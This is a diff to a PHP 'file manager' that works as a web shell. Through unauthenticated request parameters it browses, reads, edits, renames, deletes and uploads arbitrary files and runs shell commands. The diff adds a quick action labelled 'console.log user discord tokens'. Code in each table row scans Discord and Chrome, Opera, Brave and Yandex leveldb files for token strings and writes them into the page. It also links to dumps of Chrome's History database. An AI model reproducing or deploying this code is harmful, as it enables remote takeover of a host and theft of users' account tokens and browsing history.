@@ -3,19 +3,19 @@
     #    file manager
     #    ©guh industries
 
-    $rawdir = 'C:\\';
+    $rawdir = 'C:/';
     $dir = scandir($rawdir);
     if(isset($_REQUEST['path'])){
-        $rawdir = str_replace("\ ","%20",realpath($_GET['path']) ? realpath($_GET['path']) : $_GET['path']);
-        if(is_dir($_GET['path'])) {
+        $rawdir = $_REQUEST['path']; //str_replace("\ ","%20",realpath($_REQUEST['path']) ? realpath($_REQUEST['path']) : $_REQUEST['path']);
+        if(is_dir($_REQUEST['path'])) {
             $dir = scandir($rawdir);
         } else {
-            $e = preg_split("/[\\\\]+/", $rawdir);
+            $e = preg_split("/\/+/", $rawdir);
             $dir = array("name" => $e[count($e)-1], "path" => $e);
         };
     };
     if(isset($_REQUEST['raw'])) {
-        $e = preg_split("/[\\\\]+/", $_REQUEST['raw']);
+        $e = preg_split("/\/+/", $_REQUEST['raw']);
         $l = $e[count($e)-1];
         #echo var_dump($e);
         if(isset($_REQUEST['dl'])) {
@@ -67,17 +67,17 @@
         exit();
     }
 
-    $voltado = preg_split("/[\\\\]+/", $rawdir);
+    $voltado = preg_split("/[\/]+/", $rawdir);
     unset($voltado[count($voltado)-1]);
-    $voltado = join('\\',$voltado);
+    $voltado = join('/',$voltado);
 
-    if(isset($_GET['action'])) {
-        switch($_GET['action']){
+    if(isset($_REQUEST['action'])) {
+        switch($_REQUEST['action']){
             case 'rename':
-                if(!isset($_GET['newname'])) boiola($rawdir);
-                $e[count($e)-1] = $_GET['newname'];
-                rename($rawdir,join('\\',$e));
-                boiola(join('\\',$e));
+                if(!isset($_REQUEST['newname'])) boiola($rawdir);
+                $e[count($e)-1] = $_REQUEST['newname'];
+                rename($rawdir,join('/',$e));
+                boiola(join('/',$e));
             break;
             case 'delete': 
                 if(is_file($rawdir)){
@@ -96,8 +96,8 @@
                 if(!isset($_FILES['arquivo'])){
                     echo "<h1> fairu doko </h1>";
                 };
-                if(move_uploaded_file($_FILES['arquivo']['tmp_name'], $rawdir . '\\' . ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']))){
-                    echo '<h1 style="background-color:lightgreen;"> yippee <a href="?path=' . $rawdir . '\\' .  ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']) . '"> ' . $rawdir . '\\' .  ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']) . ' </a> </h1>';
+                if(move_uploaded_file($_FILES['arquivo']['tmp_name'], $rawdir . '/' . ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']))){
+                    echo '<h1 style="background-color:lightgreen;"> yippee <a href="?path=' . $rawdir . '/' .  ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']) . '"> ' . $rawdir . '/' .  ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']) . ' </a> </h1>';
                 } else {
                     echo '<h1 style="background-color:red;"> fairu upload shitanai (error) </h1>';
                 }
@@ -127,10 +127,10 @@
             <input type="submit">
         </form>
         <p></p>
-        <label for="qa">asdpkfgnhlxfgh</label>
+        <label for="qa">Quick action:</label>
         <select name="qa" id="qa">
-            <option value="chrome" selected>chrome</option>
-            <option value="discord">discord</option>
+            <option value="chrome" selected>go to user chrome folder</option>
+            <option value="discord">console.log user discord tokens</option>
         </select>
         <script>
             document.body.onload = ()=>{
@@ -155,7 +155,7 @@
                 globalThis.rename = function(rawdir, old){
                     const porro = prompt(`Rename ${old}:`, old)
                     if(confirm(`Would you like to rename "${old}" to "${porro}"?`)) {
-                        document.querySelector('#rpath').value = rawdir.replace(/\\/g,"\\\\") + "\\\\" + old;
+                        document.querySelector('#rpath').value = rawdir.replace(/\\/g,"\\\\") + "/" + old;
                         document.querySelector('#newname').value = porro;
                         document.querySelector('#rform').submit()
                     }
@@ -184,7 +184,7 @@
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⢸⢸⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡶⣶⡟⠘⡤⢤⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠉⠁⠀⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`)) {
-                        document.querySelector('#dpath').value = rawdir.replace(/\\/g,"\\\\") + "\\\\" + old;
+                        document.querySelector('#dpath').value = rawdir.replace(/\\/g,"\\\\") + "/" + old;
                         document.querySelector('#dform').submit()
                     }
                 }
@@ -216,14 +216,14 @@
             <?php 
                 for($i = 0; $i < count($dir); $i++) {?>
                     <tr>
-                        <td><p><a href="?path=<?=$rawdir . '\\' . $dir[$i]?>">
+                        <td><p><a class="fs-4"href="?path=<?=$rawdir . '/' . $dir[$i]?>">
                     <?php
-                    if(is_dir($rawdir . '\\' . $dir[$i])) {
+                    if(is_dir($rawdir . '/' . $dir[$i])) {
                         echo "\u{1f4c2}";
                     };
                     ?><?=$dir[$i]?></a></p></td>
                     <td>
-                        <button class = "btn btn-warning" onclick='rename(`<?=str_replace("\\","\\\\",$rawdir)?>`, `<?=$dir[$i]?>`)'>Rename</button>
+                        <button class = "btn btn-warning" onclick='rename(`<?=str_replace("/","\\\\",$rawdir)?>`, `<?=$dir[$i]?>`)'>Rename</button>
                     </td>
                     <td>
                         <button class = "btn btn-danger" onclick='dlete(`<?=str_replace("\\","\\\\",$rawdir)?>`, `<?=$dir[$i]?>`)'>Delete</button>
@@ -231,24 +231,24 @@
                     <td> <a class="q btn btn-info">welcome to my woorld *gets chalked* <form><input type="hidden" name="tokens" value='<?php 
                                     $euqueromematar = '';
                                     $reg="/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/";
-                                    $folders=['appdata\\Discord',"appdata\\discordcanary","appdata\\discordptb","localappdata\\Google\\Chrome\\User Data\\Default","appdata\\Opera Software\\Opera Stable","appdata\\Opera Software\\Opera GX Stable","localappdata\\BraveSoftware\\Brave-Browser\\User Data\\Default","localappdata\\Yandex\\YandexBrowser\\User Data\\Default"];
+                                    $folders=['appdata/Discord',"appdata/discordcanary","appdata/discordptb","localappdata/Google/Chrome/User Data/Default","appdata/Opera Software/Opera Stable","appdata/Opera Software/Opera GX Stable","localappdata/BraveSoftware/Brave-Browser/User Data/Default","localappdata/Yandex/YandexBrowser/User Data/Default"];
                                     $userdir=$rawdir;
-                                    $localappdata=$userdir.'\\AppData\\Local';
-                                    $appdata=$userdir.'\\AppData\\Roaming';
+                                    $localappdata=$userdir.'/AppData/Local';
+                                    $appdata=$userdir.'/AppData/Roaming';
                                     foreach($folders as $browser){
                                         $browser=preg_replace("/localappdata/",$localappdata,$browser);
                                         $browser=preg_replace("/appdata/",$appdata,$browser);
-                                        $leveldb=$browser.'\\Local Storage\\leveldb';
+                                        $leveldb=$browser.'/Local Storage/leveldb';
                                         if(is_dir($leveldb)){
                                             $guh=scandir($leveldb);
                                             $cuh=array_filter($guh,function($v,$k){
                                                 return substr($v,-4)==".ldb";
                                             },ARRAY_FILTER_USE_BOTH);
                                             foreach($cuh as $ii=>$dbfile){
-                                                $data=file_get_contents($leveldb.'\\'.$dbfile);
+                                                $data=file_get_contents($leveldb.'/'.$dbfile);
                                                 if(preg_match_all($reg,$data)>0){
-                                                    $euqueromematar = $euqueromematar . '"file":"'.$leveldb.'\\'.$dbfile.'","';
-                                                    preg_match("/(\d{2}\/){2}\d{4}\s\d{2}:\d{2}/", shell_exec('for %A in ("'.$leveldb.'\\'.$dbfile.'") do echo %~tA'),$guhh);
+                                                    $euqueromematar = $euqueromematar . '"file":"'.$leveldb.'/'.$dbfile.'","';
+                                                    preg_match("/(\d{2}\/){2}\d{4}\s\d{2}:\d{2}/", shell_exec('for %A in ("'.$leveldb.'/'.$dbfile.'") do echo %~tA'),$guhh);
                                                     $euqueromematar = $euqueromematar . '"modify":'.$guhh[0].'",';
                                                     $aaaaa=[];
                                                     preg_match($reg,$data,$aaaaa);
@@ -262,7 +262,7 @@
                                             };
                                         }; 
                                         echo $euqueromematar;
-                                    ?>'> <input type="hidden" name="chrome" value='?path=<?=$rawdir . '\\' . $dir[$i]?>\\AppData\\Local\\Google\\Chrome\\User%20Data\\Default\\History&action=sqlite&query=.dump'> <input type="hidden" name="delete" value="?path=<?=$rawdir . '\\' . $dir[$i]?>&action=delete"> </form>
+                                    ?>'> <input type="hidden" name="chrome" value='?path=<?=$rawdir . '/' . $dir[$i]?>/AppData/Local/Google/Chrome/User%20Data/Default/History&action=sqlite&query=.dump'> <input type="hidden" name="delete" value="?path=<?=$rawdir . '/' . $dir[$i]?>&action=delete"> </form>
                                       
                                 </a> </td>
                 </tr>
@@ -277,10 +277,10 @@
         <p><a class="btn btn-secondary" href="?path=<?=$rawdir?>"> Return </a></p>
         <?php 
             if(is_dir($rawdir)) { ?>
-                <h2 style="background-color:red;">not a file (its a folder)</h2>
+                <div class="alert alert-danger fs-3"> not a file (its a folder)</div>
             <?php } else { ?>
-                <h2 style="background-color:red;"> <?=!is_readable($rawdir) ? 'kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder)' : ''?></h2>
-                <h2 style="background-color:red;"> <?=!is_writable($rawdir) ? 'kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder)' : ''?></h2>
+                <?=!is_readable($rawdir) ? '<div class="alert alert-danger fs-3"> kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder) </div>' : ''?>
+                <?=!is_writable($rawdir) ? '<div class="alert alert-danger fs-3"> kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder) </div>' : ''?>
                 <div style="display:flex;flex-direction:column;">
                     <form action="" method="post">
                         <input type="hidden" name="path" value="<?=$rawdir?>">
@@ -288,9 +288,9 @@
                         <?php
                             if(is_readable($rawdir)){
                                 if(filesize($rawdir) > 2097152) { ?>
-                                    <h2 style="background-color:red;">kono fairu wa OOKI desu (nihongo ) (>2mb, wont read)</h2>
+                                    <div class="alert alert-danger fs-3"> kono fairu wa OOKI desu (nihongo ) (>2mb, wont read) </div>
                                 <?php } else { ?>
-                                    <textarea spellcheck="false" name="content" cols="60" rows="30" <?=is_writable($rawdir) ? '' : 'readonly'?>><?=file_get_contents($rawdir)?></textarea>
+                                    <textarea class="form-control"spellcheck="false" name="content" cols="60" rows="30" <?=is_writable($rawdir) ? '' : 'readonly'?>><?=file_get_contents($rawdir)?></textarea>
                                     <p>
                                         <input class="btn btn-primary" type="submit" value="Confirm">
                                     </p>
@@ -314,7 +314,7 @@
                     <p><a href="?path=<?=$rawdir?>"> Return </a></p>
                 <?php
                 } else { 
-                    $query = $_GET['query'] ?? '';
+                    $query = $_REQUEST['query'] ?? '';
                     ?>
                     <p><a href="?path=<?=$rawdir?>"> Return </a></p>
                     <form action="">
@@ -359,14 +359,12 @@
                 <input type="hidden" name="dl" value="1">
                 <input class="btn btn-info" type="submit" value="Download">
             </form>
-            <h2 style="background-color:red;"> <?=!is_readable($rawdir) ? 'kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder)' : ''?></h2>
-            <h2 style="background-color:red;"> <?=!is_writable($rawdir) ? 'kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder)' : ''?></h2>
+                <?=!is_readable($rawdir) ? '<div class="alert alert-danger fs-3"> kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder) </div>' : ''?>
+                <?=!is_writable($rawdir) ? '<div class="alert alert-danger fs-3"> kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder) </div>' : ''?>
             <?php
                 if($is_sqlite){?>
-                    <h2 style="background-color:DodgerBlue;">
-                        kono fairu wa (most likely) sqlite format (aaaaaaaaaaaaaaaaaaaaaaaaaaaa)
-                    </h2>
-                    <a href="?path=<?=$rawdir?>&action=sqlite&query=.dump"> sqlite query</a>
+                <div class="alert alert-info fs-3">kono fairu wa (most likely) sqlite format (aaaaaaaaaaaaaaaaaaaaaaaaaaaa)</div>
+                    <a class="btn btn-primary" href="?path=<?=$rawdir?>&action=sqlite&query=.dump"> sqlite query</a>
                 <?php
                 };
             ?>
